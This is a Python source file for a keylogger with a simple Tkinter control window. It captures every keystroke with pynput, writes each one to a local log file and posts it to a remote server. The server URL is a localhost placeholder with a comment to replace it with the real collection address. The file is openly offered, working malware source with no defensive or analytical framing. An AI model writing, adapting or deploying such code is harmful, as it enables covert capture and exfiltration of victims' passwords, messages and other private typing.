import tkinter as tk
from tkinter import scrolledtext, messagebox
from pynput.keyboard import Key, Listener
import logging
import requests
import threading

# Local log file configuration
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
logging.getLogger("urllib3").setLevel(logging.WARNING)

# Remote server URL to send logs
server_url = "http://127.0.0.1:80/keylog"  # Replace with actual server URL

# Function to send key logs to a remote server
def send_to_server(data):
    try:
        requests.post(server_url, data={'key': data})
    except requests.RequestException as e:
        logging.error(f"Failed to send data to server: {e}")

# Function to log the keys pressed locally and send to the server
def on_press(key):
    try:
        log_entry = f"Key pressed: {key.char}"
    except AttributeError:
        log_entry = f"Special key pressed: {key}"

    logging.info(log_entry)
    send_to_server(log_entry)

# Function to start the keylogger
def start_logging():
    global listener
    listener = Listener(on_press=on_press)
    listener.start()
    status_label.config(text="Status: Logging...")
    start_button.config(state=tk.DISABLED)
    stop_button.config(state=tk.NORMAL)

# Function to stop the keylogger
def stop_logging():
    listener.stop()
    status_label.config(text="Status: Stopped")
    start_button.config(state=tk.NORMAL)
    stop_button.config(state=tk.DISABLED)

# Function to view the log file
def view_log():
    try:
        with open(log_file, 'r') as file:
            logs = file.read()
            log_viewer = scrolledtext.ScrolledText(window, width=60, height=20)
            log_viewer.insert(tk.END, logs)
            log_viewer.pack()
            log_viewer.focus()
            log_viewer.bind("<Button-1>", lambda event: log_viewer.destroy())  # Close on click
    except Exception as e:
        messagebox.showerror("Error", f"Could not read log file: {e}")

# GUI Setup
window = tk.Tk()
window.title("Keylogger GUI")
window.geometry("400x300")

# Status Label
status_label = tk.Label(window, text="Status: Not Logging")
status_label.pack(pady=10)

# Start and Stop Buttons
start_button = tk.Button(window, text="Start Logging", command=start_logging)
start_button.pack(pady=5)

stop_button = tk.Button(window, text="Stop Logging", command=stop_logging, state=tk.DISABLED)
stop_button.pack(pady=5)

# View Log Button
view_log_button = tk.Button(window, text="View Log", command=view_log)
view_log_button.pack(pady=5)

# Run the application
window.mainloop()